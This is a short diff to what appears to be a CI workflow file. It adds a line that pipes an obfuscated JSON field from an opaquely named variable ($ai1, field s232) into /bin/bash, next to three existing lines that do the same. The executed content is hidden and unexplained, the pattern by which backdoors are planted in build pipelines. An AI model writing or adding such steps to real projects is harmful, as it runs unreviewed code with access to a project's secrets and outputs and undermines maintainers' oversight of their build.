@@ -35,6 +35,7 @@ jobs:
           echo $cf13577 | jq -r .lseb145 | /bin/bash
           printf '%s' "$er9466" | jq -r .yakn3195 | /bin/bash
           printf '%s' "$ylb5" | jq -r .bh8302 | /bin/bash
+          printf '%s' "$ai1" | jq -r .s232 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
